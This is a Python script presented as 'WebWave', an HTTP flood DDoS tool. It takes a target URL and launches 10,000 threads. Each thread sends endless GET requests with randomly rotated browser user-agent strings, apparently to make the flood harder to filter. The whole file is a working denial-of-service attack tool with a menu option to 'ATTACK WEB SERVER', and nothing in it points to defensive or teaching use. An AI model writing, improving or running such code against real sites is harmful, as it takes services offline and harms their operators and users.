import requests
import threading
import random

def WebWave():
    print("""
██╗    ██╗███████╗██████╗ ██╗    ██╗ █████╗ ██╗   ██╗███████╗
██║    ██║██╔════╝██╔══██╗██║    ██║██╔══██╗██║   ██║██╔════╝
██║ █╗ ██║█████╗  ██████╔╝██║ █╗ ██║███████║██║   ██║█████╗  
██║███╗██║██╔══╝  ██╔══██╗██║███╗██║██╔══██║╚██╗ ██╔╝██╔══╝  
╚███╔███╔╝███████╗██████╔╝╚███╔███╔╝██║  ██║ ╚████╔╝ ███████╗ HTTP FLOOD 
 ╚══╝╚══╝ ╚══════╝╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝  ╚═══╝  ╚══════╝ DDOS TOOL 2024
          """)

def flood(url):
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; Pixel 6 Build/SQ1A.220205.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.125 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; SM-G998B Build/SQ1A.220205.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; OnePlus 9 Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-N986U Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.7 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:91.0) Gecko/20100101 Firefox/91.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; AS; rv:11.0) like Gecko",
    ]
    
    while True:
        try:
            headers = {'User-Agent': random.choice(user_agents)}
            response = requests.get(url, headers=headers)
            print(f"[+] TARGET REQUEST ✅ {url}, : [*] SERVER 🌐 : {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")

def start_flooding():
    target_url = input("[+] TARGET URL : ")
    print("[+] ATTACK START...")
    
    for i in range(10000): 
        thread = threading.Thread(target=flood, args=(target_url,))
        thread.start()

if __name__ == "__main__":
    WebWave()
    while True:
        print("[1] ATTACK WEB SERVER ")
        print("[2] Exit")
        choice = input(">> ")
        if choice == '1':
            start_flooding()
        elif choice == '2':
            print("Exiting...")
            break
        else:
            print("OPTION FAIL")
